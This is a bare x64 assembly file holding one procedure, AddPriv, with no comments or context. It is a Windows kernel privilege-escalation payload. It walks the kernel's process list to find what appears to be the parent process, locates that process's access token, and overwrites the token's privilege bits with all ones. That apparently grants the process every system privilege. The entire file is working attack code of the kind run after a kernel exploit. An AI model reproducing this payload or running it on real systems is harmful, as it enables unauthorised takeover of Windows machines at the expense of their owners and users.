.code

AddPriv PROC
	mov r9, qword ptr gs:[188h]
	mov r9, qword ptr [r9 + 220h]
	mov r8, qword ptr [r9 + 3e0h]
	mov rax, r9
	loop1:
	mov rax, qword ptr [rax + 2f0h]
	sub rax, 2f0h
	cmp qword ptr [rax + 2e8h], r8
	jne loop1
	mov rcx, rax
	add rcx, 358h
	mov rax, qword ptr [rcx]
	and rax, 0FFFFFFFFFFFFFFF0h
	mov qword ptr [rax+48h], 0FFFFFFFFFFFFFFFFh
	ret
AddPriv ENDP

END